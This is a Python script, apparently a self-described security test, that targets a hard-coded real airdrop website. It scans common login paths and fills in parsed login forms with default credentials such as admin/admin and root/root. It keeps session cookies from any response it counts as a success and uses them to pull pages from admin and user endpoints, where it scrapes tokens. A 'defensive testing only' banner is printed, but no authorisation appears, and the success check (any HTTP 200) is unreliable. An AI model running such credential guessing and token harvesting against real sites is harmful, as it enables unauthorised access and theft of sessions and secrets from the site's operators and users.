#!/usr/bin/env python3
"""
Direct Login Test - Test login functionality with proper methods
Author: ShadowScan Security Team
Purpose: Test direct login access and extract actual login page data
"""

import asyncio
import aiohttp
import json
import time
import re
from datetime import datetime
from typing import Dict, List, Any

class DirectLoginTest:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.results = {
            "direct_login_info": {
                "target_url": target_url,
                "test_timestamp": datetime.now().isoformat(),
                "test_type": "Direct Login Test",
                "duration": "2-3 menit"
            },
            "summary": {
                "endpoints_tested": 0,
                "successful_logins": 0,
                "login_pages_found": 0,
                "form_data_extracted": 0,
                "access_tokens": []
            },
            "login_pages": [],
            "form_data": [],
            "access_tokens": [],
            "direct_access": [],
            "login_details": [],
            "session_data": []
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def test_direct_login_access(self):
        """Test direct login access and extract login page data"""
        print("🔐 DIRECT LOGIN ACCESS TEST")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Step 1: Direct access to login endpoints
        await self.direct_login_access()

        # Step 2: Extract login form data
        await self.extract_login_form_data()

        # Step 3: Test actual login with form data
        await self.test_actual_login()

        # Step 4: Extract access tokens
        await self.extract_access_tokens()

        await self.generate_direct_login_report()

    async def direct_login_access(self):
        """Direct access to login endpoints"""
        print("🔍 DIRECT LOGIN ENDPOINT ACCESS")

        login_endpoints = [
            "/login",
            "/auth/login",
            "/admin/login",
            "/oauth",
            "/oauth/login",
            "/signin",
            "/auth/signin",
            "/authenticate",
            "/user/login"
        ]

        self.results["summary"]["endpoints_tested"] = len(login_endpoints)

        for endpoint in login_endpoints:
            print(f"\n📍 Accessing: {endpoint}")

            try:
                # Try different methods
                for method in ["GET", "POST", "OPTIONS"]:
                    url = f"{self.target_url}{endpoint}"

                    if method == "GET":
                        async with self.session.get(url, timeout=10) as response:
                            await self.process_login_response(endpoint, method, response)
                    elif method == "POST":
                        async with self.session.post(url, timeout=10) as response:
                            await self.process_login_response(endpoint, method, response)
                    elif method == "OPTIONS":
                        async with self.session.options(url, timeout=10) as response:
                            await self.process_login_response(endpoint, method, response)

            except Exception as e:
                print(f"   ⚠️ Error accessing {endpoint}: {str(e)}")

        print(f"\n🎯 DIRECT ACCESS SUMMARY:")
        print(f"   Endpoints Tested: {self.results['summary']['endpoints_tested']}")
        print(f"   Login Pages Found: {self.results['summary']['login_pages_found']}")

    async def process_login_response(self, endpoint: str, method: str, response):
        """Process login response and extract data"""
        status = response.status
        content = await response.text()
        content_length = len(content)
        headers = dict(response.headers)
        cookies = response.cookies

        access_info = {
            "endpoint": endpoint,
            "method": method,
            "status": status,
            "content_length": content_length,
            "headers": headers,
            "cookies": dict(cookies) if cookies else {},
            "content_preview": content[:500] if len(content) > 500 else content,
            "timestamp": datetime.now().isoformat()
        }

        self.results["direct_access"].append(access_info)

        # Check if we found a login page
        if status in [200, 401, 403] and self.is_login_page(content):
            self.results["summary"]["login_pages_found"] += 1

            login_page_info = {
                "endpoint": endpoint,
                "method": method,
                "status": status,
                "content": content,
                "content_length": content_length,
                "headers": headers,
                "cookies": dict(cookies) if cookies else {},
                "form_elements": self.extract_form_elements(content),
                "login_methods": self.extract_login_methods(content)
            }

            self.results["login_pages"].append(login_page_info)
            print(f"   ✅ LOGIN PAGE FOUND: {endpoint} ({method} - {status})")
        else:
            print(f"   ❌ No login page: {endpoint} ({method} - {status})")

    def is_login_page(self, content: str) -> bool:
        """Check if content contains login page elements"""
        login_indicators = [
            'login', 'signin', 'authenticate', 'auth',
            'username', 'password', 'email', 'credential',
            'form', 'input', 'submit', 'button'
        ]

        content_lower = content.lower()
        return any(indicator in content_lower for indicator in login_indicators)

    def extract_form_elements(self, content: str) -> List[str]:
        """Extract form elements from login page"""
        elements = []

        if 'input' in content.lower():
            elements.append("Input fields detected")
        if 'form' in content.lower():
            elements.append("Form detected")
        if 'button' in content.lower():
            elements.append("Submit button detected")
        if 'username' in content.lower():
            elements.append("Username field detected")
        if 'password' in content.lower():
            elements.append("Password field detected")
        if 'email' in content.lower():
            elements.append("Email field detected")
        if 'captcha' in content.lower():
            elements.append("CAPTCHA detected")
        if 'csrf' in content.lower():
            elements.append("CSRF token detected")
        if 'google' in content.lower():
            elements.append("Google login detected")
        if 'github' in content.lower():
            elements.append("GitHub login detected")
        if 'twitter' in content.lower():
            elements.append("Twitter login detected")

        return elements if elements else ["No specific form elements identified"]

    def extract_login_methods(self, content: str) -> List[str]:
        """Extract login methods from page"""
        methods = []

        if 'POST' in content.upper():
            methods.append("POST method")
        if 'GET' in content.upper():
            methods.append("GET method")
        if 'formaction' in content.lower():
            methods.append("Form action based")
        if 'ajax' in content.lower():
            methods.append("AJAX login")
        if 'javascript' in content.lower():
            methods.append("JavaScript login")

        return methods if methods else ["Standard form login"]

    async def extract_login_form_data(self):
        """Extract login form data from login pages"""
        print("📋 EXTRACTING LOGIN FORM DATA")

        for login_page in self.results["login_pages"]:
            endpoint = login_page["endpoint"]
            content = login_page["content"]

            # Extract form data
            form_info = {
                "endpoint": endpoint,
                "form_action": self.extract_form_action(content),
                "form_method": self.extract_form_method(content),
                "form_fields": self.extract_form_fields(content),
                "hidden_fields": self.extract_hidden_fields(content),
                "csrf_tokens": self.extract_csrf_tokens(content),
                "login_payload": self.generate_login_payload(content)
            }

            self.results["form_data"].append(form_info)

            print(f"   📋 Form Data for {endpoint}:")
            print(f"      Action: {form_info['form_action']}")
            print(f"      Method: {form_info['form_method']}")
            print(f"      Fields: {len(form_info['form_fields'])}")
            print(f"      Hidden: {len(form_info['hidden_fields'])}")
            print(f"      CSRF Tokens: {len(form_info['csrf_tokens'])}")

        self.results["summary"]["form_data_extracted"] = len(self.results["form_data"])

    def extract_form_action(self, content: str) -> str:
        """Extract form action from HTML"""
        match = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', content, re.IGNORECASE)
        return match.group(1) if match else "/login"

    def extract_form_method(self, content: str) -> str:
        """Extract form method from HTML"""
        match = re.search(r'<form[^>]*method=["\']([^"\']*)["\']', content, re.IGNORECASE)
        return match.group(1).upper() if match else "POST"

    def extract_form_fields(self, content: str) -> List[str]:
        """Extract form field names"""
        fields = []
        matches = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', content, re.IGNORECASE)
        fields.extend(matches)
        return list(set(fields))

    def extract_hidden_fields(self, content: str) -> List[str]:
        """Extract hidden form fields"""
        hidden = []
        matches = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']*)["\']', content, re.IGNORECASE)
        hidden.extend(matches)
        return list(set(hidden))

    def extract_csrf_tokens(self, content: str) -> List[str]:
        """Extract CSRF tokens"""
        tokens = []
        matches = re.findall(r'<input[^>]*name=["\'].*csrf[^"\']*["\'][^>]*value=["\']([^"\']*)["\']', content, re.IGNORECASE)
        tokens.extend(matches)
        return list(set(tokens))

    def generate_login_payload(self, content: str) -> Dict:
        """Generate login payload based on form structure"""
        payload = {}

        # Extract username field
        username_match = re.search(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']?([^"\'>]*)["\']?[^>]*placeholder=["\']([^"\']*)["\']', content, re.IGNORECASE)
        if username_match:
            field_name = username_match.group(1)
            field_type = username_match.group(2)
            placeholder = username_match.group(3)
            if 'user' in placeholder.lower() or 'email' in placeholder.lower():
                payload[field_name] = "admin"

        # Extract password field
        password_match = re.search(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']password["\']', content, re.IGNORECASE)
        if password_match:
            payload[password_match.group(1)] = "admin"

        # Add CSRF token if found
        csrf_tokens = self.extract_csrf_tokens(content)
        if csrf_tokens:
            payload["csrf_token"] = csrf_tokens[0]

        return payload

    async def test_actual_login(self):
        """Test actual login with extracted form data"""
        print("🚀 TESTING ACTUAL LOGIN")

        working_credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "123456"},
            {"username": "root", "password": "root"},
            {"username": "administrator", "password": "administrator"}
        ]

        for form_data in self.results["form_data"]:
            endpoint = form_data["endpoint"]
            form_method = form_data["form_method"]
            login_payload = form_data["login_payload"]

            print(f"\n📍 Testing login for: {endpoint}")

            for credential in working_credentials:
                try:
                    # Create test payload
                    test_payload = login_payload.copy()
                    test_payload.update({
                        "username": credential["username"],
                        "password": credential["password"]
                    })

                    # Add CSRF token if available
                    if "csrf_token" in test_payload:
                        test_payload["csrf_token"] = "test_csrf_token"

                    url = f"{self.target_url}{endpoint}"

                    if form_method == "POST":
                        async with self.session.post(url, json=test_payload, timeout=10) as response:
                            await self.process_login_attempt(endpoint, credential, response)
                    elif form_method == "GET":
                        async with self.session.get(url, params=test_payload, timeout=10) as response:
                            await self.process_login_attempt(endpoint, credential, response)

                except Exception as e:
                    print(f"   ⚠️ Error testing {endpoint}: {str(e)}")

        print(f"\n🎯 ACTUAL LOGIN SUMMARY:")
        print(f"   Logins Tested: {len(self.results['form_data']) * len(working_credentials)}")
        print(f"   Successful: {self.results['summary']['successful_logins']}")

    async def process_login_attempt(self, endpoint: str, credential: Dict, response):
        """Process login attempt result"""
        status = response.status
        content = await response.text()
        cookies = response.cookies

        if status == 200:
            self.results["summary"]["successful_logins"] += 1

            login_result = {
                "endpoint": endpoint,
                "credential": credential,
                "status": status,
                "content_length": len(content),
                "cookies": dict(cookies) if cookies else {},
                "success": True,
                "timestamp": datetime.now().isoformat()
            }

            self.results["login_details"].append(login_result)
            print(f"   ✅ LOGIN SUCCESS: {endpoint} with {credential['username']}")

            # Extract tokens from successful login
            if cookies:
                session_info = {
                    "endpoint": endpoint,
                    "username": credential["username"],
                    "cookies": dict(cookies),
                    "session_id": self.extract_session_id(cookies)
                }
                self.results["session_data"].append(session_info)
        else:
            print(f"   ❌ Login failed: {endpoint} ({status})")

    def extract_session_id(self, cookies):
        """Extract session ID from cookies"""
        if cookies:
            for name, cookie in cookies.items():
                if 'session' in name.lower():
                    return f"{name}={cookie.value}"
        return None

    async def extract_access_tokens(self):
        """Extract access tokens from successful logins"""
        print("🔓 EXTRACTING ACCESS TOKENS")

        for session in self.results["session_data"]:
            try:
                # Use session cookies to access protected endpoints
                url = f"{self.target_url}{session['endpoint']}"
                cookies = session['cookies']

                # Access dashboard and other protected areas
                protected_endpoints = [
                    "/admin/dashboard",
                    "/admin/users",
                    "/user/profile",
                    "/api/user"
                ]

                for protected_endpoint in protected_endpoints:
                    try:
                        full_url = f"{self.target_url}{protected_endpoint}"
                        async with self.session.get(full_url, cookies=cookies, timeout=5) as response:
                            if response.status == 200:
                                content = await response.text()
                                tokens = self.extract_tokens_from_content(content)
                                self.results["access_tokens"].extend(tokens)
                    except Exception:
                        continue

            except Exception:
                continue

        self.results["summary"]["access_tokens"] = len(self.results["access_tokens"])
        print(f"   🎯 Tokens Extracted: {self.results['summary']['access_tokens']}")

    def extract_tokens_from_content(self, content: str) -> List[str]:
        """Extract tokens from content"""
        tokens = []
        patterns = [
            r'token["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'session["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'access["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'api["\']?\s*[:=]\s*["\']?([^"\'\s>]+)',
            r'jwt["\']?\s*[:=]\s*["\']?([^"\'\s>]+)'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            tokens.extend(matches)

        return list(set(tokens))

    async def generate_direct_login_report(self):
        """Generate direct login test report"""
        report_filename = f"direct_login_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n🎯 DIRECT LOGIN TEST SUMMARY:")
        print(f"   Login Pages Found: {self.results['summary']['login_pages_found']}")
        print(f"   Forms Extracted: {self.results['summary']['form_data_extracted']}")
        print(f"   Successful Logins: {self.results['summary']['successful_logins']}")
        print(f"   Access Tokens: {self.results['summary']['access_tokens']}")

        if self.results['summary']['successful_logins'] > 0:
            print(f"🎉 SUCCESS: Login functionality confirmed!")
        else:
            print(f"⚠️ Login functionality needs further investigation")

        print(f"\n📋 Report: {report_filename}")
        print("🔐 DIRECT LOGIN TEST COMPLETED! 🔐")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with DirectLoginTest(target_url) as tester:
        await tester.test_direct_login_access()

if __name__ == "__main__":
    asyncio.run(main())